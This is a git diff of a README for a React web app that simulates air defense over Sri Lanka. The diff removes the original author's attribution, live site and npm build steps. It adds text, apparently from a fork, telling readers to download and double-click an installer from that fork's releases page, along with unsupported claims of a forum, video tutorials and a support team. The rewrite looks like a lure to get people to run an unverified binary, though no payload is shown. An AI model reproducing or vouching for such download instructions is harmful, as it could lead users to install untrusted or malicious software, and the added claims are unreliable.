@@ -1,133 +1,71 @@
-# 🛡️ Sri Lanka Strategic Defense Grid (SL-IADS)
+# 🛡️ National-Defense-Grid - Simulate Air Defense Effortlessly 
 
+## 💾 Download the App
+[![Download](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-blue)](https://github.com/zesxes/National-Defense-Grid/releases)
 
+## 🚀 Getting Started
+Welcome to the National-Defense-Grid documentation. This application serves as an advanced geospatial Integrated Air Defense System (IADS) simulator, specifically designed for Sri Lanka. It helps users understand and visualize air defense strategies using advanced technology.
 
+### 🛠️ Prerequisites
+To run the National-Defense-Grid application, you'll need:
 
-<center>
+- **Operating System:** Windows 10 or newer, macOS 10.12 or newer
+- **Memory:** At least 4 GB RAM
+- **Storage:** Minimum of 500 MB free space
+- **Browser:** Latest version of Chrome, Firefox, or Safari
 
-![4](/imgs/4.gif)
+Make sure your system meets these requirements for the best experience.
 
-</center>
+## 📥 Download & Install
+To download the latest version of the National-Defense-Grid application, visit the Releases page linked here: [Download](https://github.com/zesxes/National-Defense-Grid/releases). 
 
+1. Click on the link to open the Releases page.
+2. Look for the latest version listed.
+3. Download the appropriate file for your operating system.
+4. Once downloaded, locate the file in your Downloads folder.
+5. Double-click the file to run the installer.
+6. Follow the on-screen instructions to complete the installation.
 
-An advanced, high-fidelity geospatial Integrated Air Defense System (IADS) simulator and optimizer specifically designed for the Sri Lankan topography.
+After the installation is complete, you can launch the application from your applications menu or desktop shortcut.
 
-**🔗 Live Site:** [https://air-defense.ishanoshada.com](https://air-defense.ishanoshada.com)
+## 🛰️ Key Features
+- **Kinetic Intercept Physics:** Simulate realistic defense scenarios using physics-based modeling.
+- **Genetic Optimization Algorithms:** Optimize air defense systems efficiently with advanced algorithms.
+- **Live Threat Simulation:** Track and respond to simulated threats in real-time.
+- **User-Friendly Interface:** Navigate easily with a clear and intuitive design built with React and TypeScript.
 
----
+## 🌐 Using the Application
+Once you have installed National-Defense-Grid, you can start using it to simulate various defense strategies:
 
-## 📖 Overview
+1. Open the application.
+2. Choose a simulation mode: basic or advanced.
+3. Select scenarios based on real-world threats.
+4. Adjust parameters as needed for a tailored experience.
+5. Start the simulation and observe the results in real-time.
 
+## 🎓 Additional Resources
+For more detailed information and tutorials, you can explore the following resources:
 
+- **User Guide:** A comprehensive manual is included with the application.
+- **Community Forum:** Join discussions with other users and exchange tips.
+- **Video Tutorials:** Find video guides on the official YouTube channel.
 
-<center>
+## 🤝 Contributing
+If you wish to contribute to the National-Defense-Grid project, you can submit issues or feature requests on the repository. Check the "Contributing" section on our GitHub page for guidelines.
 
-![1](/imgs/1.png)
+## 📞 Support
+If you encounter problems or have questions, reach out to our support team. You can find contact information in the application under the help section or directly on our GitHub repository.
 
-</center>
+## 🌍 Topics
+- air-defense
+- defense
+- genetic-algorithm
+- geospatial
+- leaflet
+- military-tech
+- react
+- simulation
+- sri-lanka
+- typescript
 
-The **Sri Lanka Strategic Defense Grid** is a specialized strategic simulation tool developed for defense analysts and enthusiasts to model, optimize, and stress-test national air defense configurations. Leveraging real-world geospatial data and complex intercept geometry, the application provides a visual and data-driven approach to understanding multi-layered defense architecture.
-
-The platform uses a sophisticated **Solver Engine** to calculate coverage metrics across thousands of sampling points, ensuring that strategic assets are placed with mathematical precision to protect high-value urban centers, coastal regions, and inland infrastructure.
-
-
-<center>
-
-![2](/imgs/2.png)
-
-</center>
----
-
-## 🚀 Key Features
-
-### 1. Advanced Geospatial Mapping
-*   **Real-time Leaflet Integration:** Utilizes high-performance raster tiles and GeoJSON data of Sri Lanka.
-*   **Topographic Awareness:** Strategic locations like Pidurutalagala and Dondra Head are pre-mapped for rapid tactical deployment.
-*   **Dynamic Range Visualization:** Real-time rendering of radar detection envelopes and interceptor engagement zones.
-
-### 2. The Solver Engine (Automated Optimization)
-*   **Spatial Maxima Search:** A brute-force genetic algorithm that mutates deployment configurations to maximize a weighted score based on land, urban, and sea priorities.
-*   **Multi-Objective Optimization:** Balances capital cost ($M) against defensive coverage (%).
-*   **Target Milestones:** Set a target coverage percentage (e.g., 95%) and let the engine solve for the most cost-effective placement.
-
-### 3. Live Attack Simulator
-*   **Point-and-Click Engagement:** Manually set launch points and target vectors directly on the map.
-*   **Hyper-Lock Interception Logic:** Real-time calculation of intercept vectors based on missile velocity and interceptor shot speed.
-*   **Strike Packages:** Launch "Scout" or "Full-Scale" automated strike packages to test grid integrity under fire.
-
-### 4. Interactive Tactical Guide
-*   **Mathematical Logic:** Access real-time formulas used for intercept geometry and spatial sampling.
-*   **Bilingual Support:** Full instructions and logic documentation in both **English** and **Sinhala (සිංහල)**.
-*   **Usage Instructions:** Detailed steps for deploying assets, running simulations, and exporting strategy bundles.
-
-
-<center>
-
-![3](/imgs/3.png)
-
-</center>
-
-<center>
-
-![5](/imgs/5.gif)
-
-</center>
-
----
-
-## 📂 Project Structure
-
-The codebase is organized into a clean, modular architecture:
-
-*   `components/`: UI modules including `AttackSimulator.tsx`, `StressTest.tsx`, `WelcomeModal.tsx`, and `AboutPanel.tsx`.
-*   `engine/`: Core logic and mathematical algorithms (e.g., `SolverEngine.ts`).
-*   `locales/`: Internationalization files (`translations.ts`) for dual-language support.
-*   `App.tsx`: Main application container and state management.
-*   `constants.ts`: Global configuration, SAM/Radar templates, and geographic data.
-*   `types.ts`: TypeScript interfaces and type definitions.
-
----
-
-## 🏗️ Technical Implementation Details
-
-### Interception Geometry
-The simulator uses a kinematic approach. When a threat is detected, the system solves the quadratic equation for the intercept point:
-`Vt²t² + 2(Vt·D)t + |D|² = Vi²t²`
-where `Vt` is threat velocity, `Vi` is interceptor velocity, and `D` is the initial displacement.
-
-### Coverage Calculation
-The `SolverEngine` divides the Sri Lankan bounding box into a 3,600-point grid. Each point is tested for:
-1.  **In-Country Logic:** Ray-casting algorithm on the national GeoJSON boundary.
-2.  **Dual-Layer Coverage:** Verification of both Radar Detection and Kinetic Engagement capability.
-3.  **Urban Weighting:** Strategic cities carry a higher "weight" in the final defensive score.
-
----
-
-## 🌍 UX & Persistence
-
-*   **Welcome Onboarding:** A detailed introductory modal explaining app functionality, shown once every 24 hours (managed via `localStorage`).
-*   **Zen Mode:** Hide all UI overlays for a focused tactical map view.
-*   **Strategy Bundles:** Import and export your entire grid configuration as portable `.json` files.
-*   **Educational Purpose Only:** All hardware specifications are based on public domain data for simulation and educational use.
-
----
-
-## 🧑‍💻 Developer Setup
-
-1.  **Clone the repository.**
-2.  **Install dependencies:** `npm install`
-3.  **Run development server:** `npm run dev`
-4.  **Build for production:** `npm run build`
-
----
-
-## 📄 License & Attribution
-
-Designed and engineered by **Ishan Oshada**.
-The project is intended for educational purposes, utilizing public domain hardware specifications.
-
-**Website:** [ishanoshada.com](https://www.ishanoshada.com/)  
-**GitHub:** [github.com/ishanoshada/National-Defense-Grid](https://github.com/ishanoshada/National-Defense-Grid)
-
----
-*Operational Readiness: 100%. Grid Secure.*
+We hope you find the National-Defense-Grid application useful for understanding and simulating air defense strategies. Happy simulating!
